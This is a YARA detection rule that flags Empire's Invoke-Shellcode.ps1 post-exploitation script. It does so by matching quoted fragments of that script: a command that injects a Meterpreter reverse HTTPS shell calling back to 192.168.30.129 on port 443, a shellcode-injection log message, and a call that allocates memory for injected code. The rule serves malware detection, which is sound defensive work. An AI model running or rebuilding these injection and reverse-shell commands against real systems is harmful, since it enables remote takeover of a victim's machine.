rule Empire_Invoke_Shellcode_alt_1
{
	meta:
		description = "Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/PowerShellEmpire/Empire"
		date = "2015-08-06"
		score = 70
		hash = "fa75cfd57269fbe3ad6bdc545ee57eb19335b0048629c93f1dc1fe1059f60438"
		os = "windows"
		filetype = "script"

	strings:
		$s1 = "C:\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos" ascii
		$s2 = "\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\" ) )" fullword ascii
		$s3 = "$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)" fullword ascii

	condition:
		filesize <100KB and 1 of them
}
